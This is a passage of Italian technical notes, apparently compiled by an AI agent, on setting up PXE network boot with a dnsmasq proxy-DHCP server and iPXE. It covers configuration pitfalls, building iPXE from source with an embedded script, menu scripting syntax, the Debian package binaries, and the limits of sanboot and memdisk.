Riavvio/applicazione: `systemctl restart dnsmasq` (SIGHUP/`systemctl reload` NON rilegge dhcp-range/pxe-service: solo hosts/resolv/dhcp-hostsfile/optsfile); verifica con `dnsmasq --test -C /etc/dnsmasq.conf` (conf-dir inclusa? NO: la conf-dir e' passata da riga di comando, quindi usare `dnsmasq --test -C /etc/dnsmasq.conf -7 /etc/dnsmasq.d,.dpkg-dist,.dpkg-old,.dpkg-new`).
```

### Binari iPXE disponibili nel pacchetto Debian ipxe 1.21.1+git20250501.dad20602+dfsg-1

*Fonte:* dpkg -L ipxe ; ls -la /usr/lib/ipxe/ — *confidenza:* alta

```
/usr/lib/ipxe/undionly.kpxe   (108847 B, BIOS, driver UNDI)
/usr/lib/ipxe/undionly.kkpxe
/usr/lib/ipxe/ipxe.pxe        (BIOS, driver nativi)
/usr/lib/ipxe/ipxe.lkrn, ipxe.iso
/usr/lib/ipxe/ipxe.efi -> ipxe-amd64.efi   (UEFI x64, driver nativi)
/usr/lib/ipxe/snponly.efi     (UEFI x64, driver SNP del firmware: spesso piu' compatibile)
/usr/lib/ipxe/ipxe-arm64.efi, ipxe-loong64.efi, ipxe-riscv64.efi
NON ESISTE ipxe32.efi / snponlyx32.efi (UEFI IA32): va compilato (make bin-i386-efi/ipxe.efi) o la riga IA32_EFI va omessa (altrimenti TFTP logga "file ... not found").
```

### Trappole

- In proxy mode dnsmasq NON risponde a nessuno se non c'è almeno un pxe-service o pxe-prompt (enable_pxe): con soli dhcp-range=...,proxy + dhcp-boot resta muto (verificato nel sorgente option.c/rfc2131.c).
- In proxy mode le dhcp-option normali NON vengono inviate (option_filter pxemode=2): per opzioni extra ai client PXE serve --dhcp-option-pxe (nuova in 2.91). Non mandare encap:175,176 (no-pxedhcp) dal proxy: iPXE lo legge solo dal DHCPOFFER del server che assegna l'IP ed è comunque controproducente.
- iPXE ignora una risposta proxy con siaddr=0: dnsmasq azzera siaddr (clear_packet) per i client BIOS, quindi dhcp-boot per iPXE DEVE avere il server esplicito: dhcp-boot=tag:ipxe,http://10.10.0.254/boot.ipxe,,10.10.0.254 (l'appnote iPXE usa addirittura 0.0.0.1 come dummy).
- Loop iPXE: se a iPXE arriva un menu PXE (pxe-service senza tag:!ipxe) iPXE in autoboot esegue il menu e ricarica undionly.kpxe. Usare tag:!ipxe sui pxe-service (o la Variante B senza pxe-service). Lo script embedded 'dhcp / chain http://...' del piano Pixio rende il loop impossibile comunque.
- Nel file, tra più dhcp-boot con tag che matchano vince l'ULTIMO (lista costruita in ordine inverso): tenere la riga tag:ipxe per ultima.
- pxe-service: se il basename contiene un punto (undionly.kpxe, ipxe.efi) NON viene aggiunto '.0'; con basename senza punto il file richiesto sarà <basename>.0. CSA x86-64_EFI = arch 7 e BC_EFI = arch 9 (invertiti rispetto al testo originale di RFC 4578, fix dnsmasq 2.76). Il confronto del nome CSA è case-insensitive.
- Il pxe_uefi_workaround scatta solo se c'è ESATTAMENTE UN pxe-service applicabile per quel CSA: due voci X86-64_EFI (es. ipxe.efi + 'boot locale') riportano il menu PXE, che molti firmware UEFI non gestiscono.
- dhcp-script NON scatta in proxy mode (nessun lease); solo l'azione 'tftp' (a fine trasferimento). L'IP dei client firmware in proxy mode si vede solo nelle righe PXE(...) su :4011, in dnsmasq-tftp 'sent ... to IP' e nell'access log nginx.
- Il pacchetto Debian ipxe non contiene ipxe32.efi (IA32): compilarlo o togliere la riga IA32_EFI. snponly.efi (presente) è spesso più compatibile di ipxe.efi su firmware UEFI reali.
- dnsmasq gira come utente 'dnsmasq' (uid 988, gruppo nogroup): /srv/pixio/tftp e i file devono essere leggibili da tutti; NON usare tftp-secure (i file sono di root). log-facility su file: la directory deve esistere; dnsmasq crea il file come root e lo chown-a a dnsmasq (log.c). rsyslog non è installato: il log va in journald (journalctl -u dnsmasq -o json).
- SIGHUP/`systemctl reload dnsmasq` NON rilegge dhcp-range/pxe-service/dhcp-boot: dopo che la GUI riscrive pixio.conf serve `systemctl restart dnsmasq`. Testare con `dnsmasq --test -C /etc/dnsmasq.conf -7 /etc/dnsmasq.d,.dpkg-dist,.dpkg-old,.dpkg-new` (la conf-dir è passata da riga di comando, non dal file).
- Tutti i file in /etc/dnsmasq.d vengono letti (anche senza estensione .conf) tranne *.dpkg-*: non lasciare backup tipo pixio.conf.bak nella directory.
- In modalità DHCP completo dnsmasq pinga l'IP prima dell'OFFER: la prima offerta arriva dopo ~3 s (nel test il client con timeout 3 s l'ha persa); con firmware PXE impazienti valutare no-ping. Con port=0 il default dell'opzione dns-server (= IP di dnsmasq) è sbagliato: impostare option:dns-server esplicitamente.
- Il check Debian di start_resolvconf cerca '^port=0' SOLO in /etc/dnsmasq.conf (non in dnsmasq.d): oggi irrilevante (resolvconf assente), ma da ricordare se lo si installa.

### Domande aperte

- Non ho potuto testare con firmware reali (QEMU/OVMF o hardware): il test live usa pacchetti PXE emulati che riproducono i flussi documentati di EDK2 e iPXE; la QEMU TCG+OVMF prevista nel piano resta il test definitivo (attenzione: -netdev user di QEMU fa esso stesso da DHCP, non da proxy).
- La pagina ipxe.org/howto/chainloading attuale non contiene più lo snippet dnsmasq storico (dhcp-userclass=set:ipxe,iPXE); la fonte ufficiale iPXE per dnsmasq proxy è ipxe.org/appnote/proxydhcp (config dichiarata 'known working' con 2.85).
- Confidenza media sul comportamento di firmware UEFI non-EDK2 (Apple, alcuni HP/Dell legacy) con la risposta 'ProxyBinl' senza option 43: il workaround dnsmasq 2.76+ è nato proprio per loro, ma esistono ancora ROM che vogliono siaddr anche nell'OFFER (già presente) o un delay (dhcp-reply-delay=1).
- Se in LAN il DHCP 10.10.0.1 invia già option 66/67 o siaddr propri, i firmware possono preferire quell'offerta ('DhcpPxe10/DhcpWfm11a' hanno priorità in EDK2 su 'ProxyPxe10'): in quel caso serve rimuovere quelle opzioni dal DHCP esistente o passare a modalità completa.
- Per la lista 'client visti' la correlazione MAC<->IP dei client firmware in proxy mode resta indiretta (riga PXE su :4011 o ARP dopo il TFTP); la soluzione più robusta è far passare mac/arch/platform come query string da boot.ipxe (chain http://10.10.0.254/boot.ipxe?mac=${net0/mac}&arch=${buildarch}&platform=${platform}).

## Build iPXE da sorgente su Debian 13 (gcc 14) con script embedded; sintassi script/menu iPXE; binari Debian; sanboot/memdisk per ISO

Build VERIFICATA sulla macchina (Debian 13, gcc 14.2.0-19): `git clone https://github.com/ipxe/ipxe && cd ipxe/src && make -j3 bin/undionly.kpxe bin-x86_64-efi/ipxe.efi bin-x86_64-efi/snponly.efi bin-i386-efi/ipxe.efi EMBED=/percorso/embed.ipxe` compila SENZA errori e SENZA bisogno di NO_WERROR=1 (commit upstream ff6e52063e0b, 7 set 2026, versione "iPXE 2.0.0+"). Il bug gcc-14 (#1219, -Werror=maybe-uninitialized in etherfabric.c) è fixato dal commit 7f75d320f (set 2024); NO_WERROR=1 resta il paracadute (Debian lo usa sempre). Dipendenze già presenti: build-essential, liblzma-dev, perl, mtools (xorriso/isolinux solo per .iso). Le opzioni vanno messe in src/config/local/general.h e src/config/local/console.h (file vuoti creati dal Makefile, ignorati da git, inclusi DOPO gli #undef di piattaforma: quindi `#define DOWNLOAD_PROTO_HTTPS` in local/general.h riabilita HTTPS anche su pcbios); mai sed sui config/*.h. Script embedded testato in QEMU BIOS (undionly.kpxe via TFTP) e UEFI (OVMF PXEv4 -> ipxe.efi via TFTP): `:retry / dhcp || goto retry / chain http://${next-server}/boot.ipxe || chain http://10.10.0.254/boot.ipxe || shell`. Menu testato end-to-end su entrambe le piattaforme: menu/item --gap/--key/--default, choose --default x --timeout 3000 selected || goto cancel, goto ${selected} || goto unknown, colour --rgb / cpair, cpuid --ext 29, iseq ${platform} efi, isset, imgfree, sleep N (secondi), poweroff (funziona in QEMU BIOS e UEFI). ${platform}=pcbios|efi, ${buildarch}=i386 (undionly.kpxe) | x86_64 (ipxe.efi), ${manufacturer}/${product}/${uuid} da SMBIOS, ${next-server}=siaddr. Su UEFI l'initrd è esposto via LoadFile2/LINUX_EFI_INITRD_MEDIA_GUID: kernel >= 5.7 non ha bisogno di `initrd=`; per kernel < 5.7 servire `initrd=initrd.magic`. Binari Debian /usr/lib/ipxe (1.21.1+git20250501): undionly.kpxe, undionly.kkpxe, ipxe.pxe, ipxe.lkrn, ipxe.iso, ipxe.efi(->ipxe-amd64.efi), snponly.efi; NIENTE i386 EFI, nessuno script embedded, ma con HTTPS/IPv6/PNG/CONSOLE_CMD/PING/REBOOT/POWEROFF/VLAN/NFS abilitati. sanboot http legge l'ISO a blocchi via HTTP Range (512 B/blocco, HEAD per Content-Length: nginx OK, non carica tutto in RAM), ma il disco virtuale sparisce quando l'OS passa ai propri driver (BIOS INT13 / EFI dopo ExitBootServices): ISO Windows NON installabili via sanboot né in BIOS né in UEFI (WinPE parte, poi non trova il supporto); memdisk è solo BIOS, ISO intera in RAM e la maggior parte delle ISO Linux/Windows fallisce dopo il boot del kernel. Gotcha QEMU: OVMF Debian 2025.02 non crea boot option PXE senza `-device virtio-rng-pci`.

### 1. Build verificata (comandi esatti eseguiti, esito 0, gcc 14.2.0-19)

*Fonte:* Build reale in /tmp/claude-0/-root/a61e104e-c882-489d-9424-4cc40310c811/scratchpad/ipxe/src (log build.log); https://ipxe.org/download; https://github.com/ipxe/ipxe/issues/1219; https://github.com/ipxe/ipxe/commit/7f75d320f; src/Makefile.housekeeping righe 502-507, 595-612 — *confidenza:* alta

```
# Dipendenze (tutte già installate: build-essential 12.12, liblzma-dev 5.8.1, perl 5.40, mtools 4.0.48, git; xorriso+isolinux/syslinux-common solo per bin/ipxe.iso)
git clone --depth 1 https://github.com/ipxe/ipxe.git
cd ipxe/src
# opzioni in config/local/*.h (vedi snippet 2)
make -j3 bin/undionly.kpxe bin-x86_64-efi/ipxe.efi bin-x86_64-efi/snponly.efi bin-i386-efi/ipxe.efi EMBED=/percorso/assoluto/embed.ipxe
# risultato: bin/undionly.kpxe 112090 B, bin-x86_64-efi/ipxe.efi 1172992 B, bin-x86_64-efi/snponly.efi 308736 B, bin-i386-efi/ipxe.efi 1062912 B
# versione compilata: 'iPXE 2.0.0+ (gff6e5)' (commit ff6e52063e0b37062394fe37b9788af25175e7af, 2026-09-07); Makefile: VERSION_MAJOR := 2, VERSION_MINOR := 0, VERSION_PATCH := 0
# EMBED accetta più file separati da virgola: EMBED=a.ipxe,b.ipxe (Makefile.housekeeping: EMBEDDED_FILES := $(subst $(COMMA), ,$(EMBED)))
# make rileva il cambio di EMBED tramite $(BIN)/.embedded.list e ricompila solo l'oggetto embedded.
# Fallback se compare un errore -Werror con gcc nuovo:
make ... NO_WERROR=1
# Makefile.housekeeping:
#   # Inhibit -Werror if NO_WERROR is specified on make command line
#   ifneq ($(NO_WERROR),1)
#   CFLAGS   += -Werror
#   ASFLAGS  += --fatal-warnings
#   HOST_CFLAGS += -Werror
#   endif
# Il Makefile aggiunge da solo -Wno-address, -Wno-stringop-truncation, -Wno-address-of-packed-member, -Wno-unterminated-string-initialization (gcc 15), -Wno-array-bounds -Wno-dangling-pointer.
# Bug noto gcc 14: issue #1219 "'reg.u32[0]' may be used uninitialized [-Werror=maybe-uninitialized]" in drivers/net/etherfabric.c -> fixato dal commit 7f75d320f "[etherfabric] Fix use of uninitialised variable in falcon_xaui_link_ok()" (chiuso 2024-09-02). Con il master attuale NON serve NO_WERROR.
# Nota: i nomi target sono fissi (bin/undionly.kpxe ecc.): 'make bin/undionly-test.kpxe' FALLISCE (undefined symbol obj_ipxe_test). Per due varianti con EMBED diverso, ricompilare (cambia solo embedded.o) e copiare via il binario, oppure usare CONFIG=<nome> (output in bin-<arch>-<platform>-<nome>).
```

### 2. Opzioni di build: usare config/local/general.h e config/local/console.h (testato)

*Fonte:* src/config/general.h, src/config/console.h, src/config/local/.gitignore, src/Makefile.housekeeping (albero clonato); https://ipxe.org/appnote/named_config; https://ipxe.org/buildcfg — *confidenza:* alta

```
# I file config/local/*.h vengono creati vuoti dal make ($(CONFIG_LOCAL_HEADERS): $(TOUCH) $@), sono in .gitignore (config/local/.gitignore contiene '*' e '!.gitignore') e vengono inclusi IN CODA a ogni config/<x>.h:
#   config/general.h righe 308-311:
#   #include <config/named.h>
#   #include NAMED_CONFIG(general.h)
#   #include <config/local/general.h>
#   #include LOCAL_NAMED_CONFIG(general.h)
# quindi un #define in local/ vince sugli #undef di piattaforma (es. general.h: #if defined(PLATFORM_pcbios) #undef DOWNLOAD_PROTO_HTTPS ... #undef CONSOLE_CMD #undef NTP_CMD #undef PARAM_CMD #undef VLAN_CMD #undef PCI_CMD #undef CERT_CMD #endif). NON serve sed su config/general.h.

# --- src/config/local/general.h (usato nella build verificata) ---
#define DOWNLOAD_PROTO_HTTPS
#define NET_PROTO_IPV6
#define CONSOLE_CMD
#define IMAGE_PNG
#define PING_CMD
#define NSLOOKUP_CMD
#define REBOOT_CMD
#define POWEROFF_CMD
#define VLAN_CMD
#define NTP_CMD
#define PARAM_CMD

# --- src/config/local/console.h ---
#define CONSOLE_SERIAL        /* per i test QEMU: -serial file:..., output 115200 8n1 */
#define CONSOLE_FRAMEBUFFER   /* necessario per 'console --picture' su BIOS (di default e' #undef su pcbios) */

# Default upstream rilevanti (config/general.h, master 2026-09):
#  gia' ON: DOWNLOAD_PROTO_HTTP/TFTP/DATA, DOWNLOAD_PROTO_HTTPS (ma #undef su pcbios), NET_PROTO_IPV6 (#undef su pcbios), IMAGE_PNG, IMAGE_SCRIPT, MENU_CMD, SANBOOT_CMD (+SANBOOT_PROTO_HTTP/ISCSI/AOE/FCP), SHELL_CMD, DHCP_CMD, IFMGMT_CMD, IMAGE_CMD, NVO_CMD, ROUTE_CMD, LOGIN_CMD, CPUID_CMD (x86), REBOOT_CMD e POWEROFF_CMD (dentro #if ! defined(REBOOT_NULL)), CONSOLE_CMD/VLAN_CMD/NTP_CMD/PARAM_CMD (solo EFI), IMAGE_BZIMAGE/ELF/MULTIBOOT/PXE (pcbios), IMAGE_EFI (efi)
#  OFF: PING_CMD, NSLOOKUP_CMD, IMAGE_TRUST_CMD, NEIGHBOUR_CMD, IPSTAT_CMD, TIME_CMD, PXE_CMD, IMAGE_COMBOOT, IMAGE_GZIP, IMAGE_ZLIB, DOWNLOAD_PROTO_NFS/FTP
# console.h default: CONSOLE_FRAMEBUFFER/SYSLOG/SYSLOGS/DMESG ON ma #undef FRAMEBUFFER/SYSLOG/SYSLOGS su pcbios; CONSOLE_SERIAL commentato; KEYBOARD_MAP us (dynamic su EFI); LOG_LEVEL LOG_NONE.
# Framebuffer: BIOS = arch/x86/interface/pcbios/vesafb.c (VESA), EFI = interface/efi/efi_fbcon.c (GOP).
# Banner 'Features' ottenuto: BIOS 'DNS HTTP HTTPS iSCSI TFTP VLAN AoE ELF MBOOT PXE bzImage Menu PXEXT'; EFI 'DNS HTTP HTTPS iSCSI TFTP VLAN SRP AoE EFI Menu'.
```

### 3. Script embedded robusto (testato in QEMU BIOS e UEFI)

*Fonte:* Test QEMU: /tmp/claude-0/-root/a61e104e-c882-489d-9424-4cc40310c811/scratchpad/test/bios.log e uefi2.log; https://ipxe.org/scripting; https://ipxe.org/cmd/isset; https://ipxe.org/cmd/goto; https://ipxe.org/cmd/ifconf; https://ipxe.org/cmd/sleep; https://ipxe.org/cmd/ifopen; https://ipxe.org/cmd/shell; https://ipxe.org/cmd/prompt; src/hci/commands/dhcp_cmd.c; src/net/udp/dhcp.c righe 300-330, 596-625; src/core/settings.c — *confidenza:* alta

```
#!ipxe
:retry
dhcp || goto retry
chain http://${next-server}/boot.ipxe || chain http://10.10.0.254/boot.ipxe || shell

# Varianti/regole (ipxe.org/scripting, cmd:isset, cmd:goto, cmd:dhcp, cmd:ifconf, cmd:sleep, cmd:ifopen):
# - 'iPXE will terminate a script immediately if any line of the script fails' -> usare '||' come via di fuga; 'dhcp ||' (comando vuoto dopo ||) sopprime l'errore.
# - Operatori: '&&' (esegue se successo), '||' (esegue se fallimento). NB: il separatore ';' NON esiste in core/exec.c (solo "||" e "&&").
# - dhcp e' sinonimo di ifconf: hci/commands/dhcp_cmd.c: COMMAND ( dhcp, ifconf_exec ) /* synonym for 'ifconf' */. Opzioni: --timeout <ms>, --configurator dhcp|ipv6. 'dhcp' senza argomenti configura tutte le interfacce; 'dhcp net0' solo net0.
# - Retry con attesa e con controllo proxyDHCP (ipxe.org/cmd/ifconf, cmd:isset):
:retry_dhcp
dhcp --timeout 15000 && isset ${filename} || goto retry_dhcp
# oppure con pausa:
:retry
dhcp || sleep 3 && goto retry
# - sleep <seconds>: 'Do nothing for the specified number of seconds. The sleep may be interrupted by pressing Ctrl-C' (core/exec.c COMMAND_DESC ... "<seconds>"). Fallisce se interrotto -> 'sleep 3 ||'.
# - isset <value>: successo se il valore esiste. iseq <v1> <v2>: successo se uguali. goto <label>: fallisce solo se la label non esiste ('goto host_${hostname} || goto unknown').
# - ifopen [net0 ...] apre l'interfaccia senza configurarla (utile per 'set net0/ip ...' statico); ifclose; ifstat; iflinkwait.
# - shell: 'dhcp || shell'; exit [status] esce da script/shell.
# - ${next-server}: core/settings.c .name="next-server" .description="TFTP server" .tag=DHCP_EB_SIADDR .type=setting_type_ipv4 (campo siaddr del pacchetto DHCP; con QEMU user-net = 10.0.2.2). ProxyDHCP: net/udp/dhcp.c registra l'offerta proxy come blocco settings "proxydhcp" solo se dhcp_has_pxeopts(): 'siaddr != 0 AND option 67 (DHCP_BOOTFILE_NAME) presente' oppure PXE boot menu presente. Con dnsmasq proxy, siaddr = IP del server dnsmasq -> ${next-server} corretto (non testato qui: vedi open_questions).
# - Il prompt 'Press Ctrl-B' sparisce con script embedded (ipxe.org/embed); per ridarlo: prompt --key 0x02 --timeout 2000 Press Ctrl-B for the iPXE command line... && shell ||
# - Alternativa senza ricompilare (solo EFI): ipxe.efi cerca automaticamente 'autoexec.ipxe' nella directory TFTP da cui e' stato caricato (log OVMF: 'autoexec.ipxe... Not found (https://ipxe.org/2d12618e)'). Non disponibile su undionly.kpxe.
```

### 4a. Menu iPXE: script di test ESEGUITO con successo su BIOS (undionly.kpxe) e UEFI (ipxe.efi)

*Fonte:* Test QEMU eseguito (scratchpad/test/bios.log, uefi2.log); https://ipxe.org/cfg/platform; https://ipxe.org/cfg/buildarch; https://ipxe.org/cmd/cpuid; src/interface/smbios/smbios_settings.c — *confidenza:* alta

```
#!ipxe
echo platform=${platform} buildarch=${buildarch} mac=${net0/mac} ip=${net0/ip} hostname=${hostname} next-server=${next-server} filename=${filename}
echo manufacturer=${manufacturer} product=${product} uuid=${uuid} version=${version}
cpuid --ext 29 && set arch x86_64 || set arch i386
isset ${net0/ip} && echo ip is set || echo ip NOT set
iseq ${platform} efi && echo PLATFORM-IS-EFI || echo PLATFORM-IS-BIOS
colour --rgb 0x191970 4
cpair --foreground 7 --background 4 1
menu Pixio test menu
item --gap -- ---- Sistemi ----
item --key l linux  Linux test
item --key w --default win  Windows test
item --gap
item shell  Shell iPXE
item exit  Esci
choose --default win --timeout 3000 selected || goto cancel
echo selected=${selected}
goto ${selected} || goto unknown
:linux
echo linux
goto done
:win
echo win chosen
imgstat
goto done
:cancel
echo cancelled
goto done
:unknown
echo unknown
:done
sleep 1
imgfree
echo TEST-OK
poweroff
echo poweroff-failed
exit

# Output reale BIOS: platform=pcbios buildarch=i386 mac=52:54:00:12:34:56 ip=10.0.2.15 hostname= next-server=10.0.2.2 filename=undionly.kpxe / manufacturer=QEMU product=Standard PC (i440FX + PIIX, 1996) uuid=00000000-... version=2.0.0+ (gff6e5) / arch=x86_64 / PLATFORM-IS-BIOS / [menu con countdown (3)(2)(1)] / selected=win / win chosen / TEST-OK -> poweroff riuscito (QEMU terminato, exit 0)
# Output reale UEFI (OVMF PXEv4 -> TFTP ipxe.efi): platform=efi buildarch=x86_64 ... filename=ipxe.efi / PLATFORM-IS-EFI / selected=win / TEST-OK -> poweroff riuscito.
# NB: ${buildarch} e' l'arch di COMPILAZIONE (undionly.kpxe = i386 anche su CPU 64 bit): per l'arch reale usare cpuid --ext 29 (long mode).
```

### 4b. Sintassi dei comandi menu/immagini (sinossi ufficiali)

*Fonte:* https://ipxe.org/cmd/menu; https://ipxe.org/cmd/item; https://ipxe.org/cmd/choose; https://ipxe.org/cmd/console; https://ipxe.org/cmd/colour; https://ipxe.org/cmd/cpair; https://ipxe.org/cmd/imgfetch; https://ipxe.org/cmd/chain; https://ipxe.org/cmd/imgstat; https://ipxe.org/cmd/imgfree; https://ipxe.org/cmd/sanboot; https://ipxe.org/cmd/reboot; https://ipxe.org/cmd/poweroff; https://ipxe.org/cmd/exit; https://ipxe.org/howto/winpe; https://ipxe.org/wimboot; src/hci/commands/image_cmd.c, dynui_cmd.c, sanboot_cmd.c — *confidenza:* alta

```
menu [--name <name>] [--delete] [<title>]
item [--menu <menu>] [--key <key>] [--default] [<name>|--gap [<text>]]      # --key: carattere o codice (F5 0x107e, F12 0x197e, Ctrl-A..Z 0x01-0x1a). 'Shortcut keys aren't auto-displayed; include them in display text manually'. Testo separatore che inizia con '-' richiede '--': item --gap -- ----- Titolo -----
choose [--menu <menu>] [--default <label>] [--keep] [--timeout <timeout>] [--retimeout <timeout>] <setting>   # timeout in MILLISECONDI; 0/assente = attesa infinita; Esc/Ctrl-C -> comando fallisce ('choose os || goto cancelled'); 'Menus are automatically deleted by the choose command'
choose --default exit --timeout 3000 target && goto ${target}

console [--x <width>] [--y <height>] [--left <n>] [--right <n>] [--top <n>] [--bottom <n>] [--depth <d>] [--picture <uri>] [--keep]   # richiede CONSOLE_CMD + CONSOLE_FRAMEBUFFER (+ IMAGE_PNG per PNG). 'console' senza opzioni ripristina il testo. Es: console --picture http://10.10.0.254/pxe/boot/bg.png --left 32 --right 32 --top 32 --bottom 48
colour [--basic <0-7>] [--rgb <0xRRGGBB>] <colour 0-7>      # indice 9 = default, non ridefinibile; 15 (--basic) = trasparente
cpair [--foreground <idx>] [--background <idx>] <pair>       # pair 0 default(9/9), 1 testo UI normale (7/4), 2 evidenziato (7/1), 3 separatori (6/4), 4 testo editabile (0/6), 5 errori (7/1), 6 URL help (6/4), 7 selezione menu PXE (0/7). cpair 0 = reset.

imgfetch|module|initrd [--name <name>] [--timeout <ms>] [--quiet] [--autofree] <uri> [<arguments>...]
kernel|imgselect|imgload [--name <name>] [--timeout <ms>] [--quiet] [--autofree] <uri|image> [<arguments>...]
chain|imgexec|boot [--name <name>] [--timeout <ms>] [--quiet] [--autofree] [--replace] [<uri|image> [<arguments>...]]   # 'There is no difference between chain, imgexec and boot'; --replace = exec() (libera la memoria dello script chiamante); --autofree libera l'immagine dopo l'esecuzione. URI relativi risolti rispetto allo script (${cwuri}).
imgstat [<image>...]      # es: 'vmlinuz : 2904736 bytes [bzImage] [SELECTED] "console=ttyS0..."'
imgfree [<image>...]      # senza argomenti libera TUTTE le immagini: usarlo in ':retry' e prima di ogni voce del menu
imgargs <image> [<args>]  # solo retrocompatibilita'
sanboot [--drive <drive>] [--filename <f>] [--extra <f>] [--label <l>] [--uuid <u>] [--no-describe] [--keep] [<root-path>] [<root-path>...]
sanboot --no-describe --drive 0x80      # boot disco locale (ipxe.org/cmd/sanboot esempio ufficiale); default drive = san_default_drive()
sanboot http://10.10.0.254/pxe/isofile/<slug>.iso
exit [<status>] ; reboot [--warm] [--setup] (REBOOT_CMD) ; poweroff (POWEROFF_CMD, 'This may not work on all systems') ; shell ; prompt [--key <key>] [--timeout <ms>] [<text>] ; echo [-n] ... ; set <setting>[:type] <value>

# Rename per wimboot (ipxe.org/howto/winpe, ipxe.org/cmd/imgfetch): l'argomento dopo l'URI diventa il nome del file nel 'magic initrd':
kernel wimboot
initrd winpeshl.ini winpeshl.ini
initrd install.cmd install.cmd
initrd http://srv/pxe/iso/<slug>/boot/bcd       BCD
initrd http://srv/pxe/iso/<slug>/boot/boot.sdi  boot.sdi
initrd http://srv/pxe/iso/<slug>/sources/boot.wim boot.wim
boot
# forma equivalente: initrd -n boot.wim ${arch}/winpe.wim boot.wim  (howto:winpe AIK). wimboot estrae da solo bootmgr (BIOS) e bootmgfw.efi (UEFI) + BCD dal boot.wim: BCD/boot.sdi opzionali. I file iniettati compaiono in X:\Windows\System32. wimboot: https://github.com/ipxe/wimboot/releases/latest/download/wimboot (unico binario BIOS+UEFI x64, Secure Boot ok).
# Linux: 'initrd file dest' con parametro 'mode=755' per eseguibili e 'mkdir=1' per creare directory (ipxe.org/cmd/imgfetch).
```

### 4c. Kernel Linux + initrd su UEFI: 'initrd=' serve solo per kernel < 5.7

*Fonte:* https://ipxe.org/cmd/imgfetch; src/interface/efi/efi_file.c; src/config/general.h (IMAGE_BZIMAGE solo PLATFORM_pcbios, IMAGE_EFI solo PLATFORM_efi); https://github.com/ipxe/ipxe/discussions/902 — *confidenza:* alta

```
# ipxe.org/cmd/imgfetch: 'Systems running Linux versions prior to 5.7 require the kernel command-line parameter initrd=initrd.magic when booting via UEFI.'
# src/interface/efi/efi_file.c: iPXE espone le immagini scaricate come file (nome case-insensitive) in un filesystem virtuale EFI, piu' il file sintetico 'initrd.magic' (CPIO che concatena tutte le immagini non nascoste); 'Linux 5.7 introduced capability to autodetect an initrd by searching for a handle via a fixed vendor-specific Linux initrd device path' -> iPXE installa EFI_LOAD_FILE2_PROTOCOL su LINUX_EFI_INITRD_MEDIA_GUID {0x5568e427,0x68fc,0x4f3d,{0xac,0x74,0xca,0x55,0x52,0x31,0xcc,0x68}}; il kernel (CONFIG_EFI_LOAD_FILE2_INITRD, default y) lo trova senza 'initrd='.
# Ricetta portabile BIOS+UEFI (l'aggiunta 'initrd=initrd.magic' e' innocua su BIOS e su kernel recenti):
kernel http://srv/pxe/iso/<slug>/casper/vmlinuz initrd=initrd.magic boot=casper netboot=url url=http://srv/pxe/isofile/<slug>.iso ip=dhcp ---
initrd http://srv/pxe/iso/<slug>/casper/initrd
boot
# Su UEFI il bzImage e' avviato come eseguibile PE tramite l'EFI stub del kernel (IMAGE_EFI; non esiste IMAGE_BZIMAGE su efi in config/general.h), quindi servono kernel con CONFIG_EFI_STUB (tutte le distro moderne).
# Su BIOS (arch/x86/image/bzimage.c) iPXE concatena tutti gli initrd (magic initrd, header CPIO per i file rinominati) e li passa al kernel via boot protocol: nessun parametro necessario.
```

### 5. Binari del pacchetto Debian 'ipxe' (1.21.1+git20250501.dad20602+dfsg-1, installato)

*Fonte:* ls -la /usr/lib/ipxe; dpkg -l; /usr/share/doc/ipxe/NEWS.Debian.gz; https://sources.debian.org/data/main/i/ipxe/1.21.1+git20250501.dad20602+dfsg-1/debian/ipxe.install; .../debian/patches/config-local.patch; .../debian/rules; https://ipxe.org/appnote/buildtargets — *confidenza:* alta

```
/usr/lib/ipxe/undionly.kpxe   108847 B  (BIOS, chainload PXE, driver UNDI)
/usr/lib/ipxe/undionly.kkpxe  108804 B  (BIOS, non scarica il PXE base code: solo per BIOS buggati)
/usr/lib/ipxe/ipxe.pxe        352606 B  (BIOS, driver nativi)
/usr/lib/ipxe/ipxe.lkrn       351727 B  (avviabile da GRUB/syslinux)
/usr/lib/ipxe/ipxe.iso        9437184 B
/usr/lib/ipxe/ipxe.efi -> ipxe-amd64.efi 996864 B (UEFI x64, driver nativi)
/usr/lib/ipxe/snponly.efi     284672 B  (UEFI x64, usa SNP del firmware, solo NIC da cui e' stato caricato)
/usr/lib/ipxe/ipxe-arm64.efi, ipxe-riscv64.efi, ipxe-loong64.efi
# LIMITI: (a) NESSUN binario i386 EFI (bin-i386-efi/ipxe.efi non e' pacchettizzato: debian/ipxe.install elenca solo i386-pcbios, x86_64-efi, arm64, riscv64, loong64) -> per client UEFI ia32 serve la build da sorgente; (b) nessuno script embedded: dopo 'dhcp' iPXE avvia ${filename} -> boot loop se dnsmasq non distingue user-class 'iPXE' (option 77) -> con i binari Debian il tag dnsmasq 'ipxe' -> http://<ip>/boot.ipxe e' OBBLIGATORIO; (c) i ROM efi-*.rom di ipxe-qemu NON contengono piu' lo stack iPXE (NEWS ipxe-qemu 2025-04).
# Opzioni compilate da Debian (debian/patches/config-local.patch): local/console.h: CONSOLE_FRAMEBUFFER; local/general.h: ROM_BANNER_TIMEOUT 0, IMAGE_PNG, CONSOLE_CMD, NET_PROTO_IPV6, DOWNLOAD_PROTO_NFS, DOWNLOAD_PROTO_HTTPS, CERT_CMD, VLAN_CMD, REBOOT_CMD, POWEROFF_CMD, PING_CMD. Non abilitati: NSLOOKUP_CMD, CONSOLE_SERIAL. Build Debian con NO_WERROR=1 e CONFIG=qemu per i ROM.
# Fallback rapido: cp /usr/lib/ipxe/undionly.kpxe /usr/lib/ipxe/ipxe.efi /usr/lib/ipxe/snponly.efi /srv/pixio/tftp/ ; per ia32 EFI usare la build propria o saltare.
# Altri binari utili gia' presenti: /usr/lib/syslinux/memdisk (syslinux-common 6.04, 26664 B); /boot/memtest86+x64.bin, memtest86+x64.efi, memtest86+ia32.bin, memtest86+ia32.efi (memtest86+ 7.20). wimboot NON e' pacchettizzato in Debian: scaricarlo da GitHub.
```

### 6. sanboot HTTP / memdisk: come funzionano e limiti reali per ISO grandi e Windows

*Fonte:* src/net/tcp/httpblock.c; src/arch/x86/interface/pcbios/int13.c; src/interface/efi/efi_block.c; https://ipxe.org/cmd/sanboot; https://wiki.syslinux.org/wiki/index.php?title=MEMDISK; https://github.com/ipxe/ipxe/discussions/962; https://forums.fogproject.org/topic/11622/ipxe-boot-windows-10-iso-via-uefi — *confidenza:* alta

```
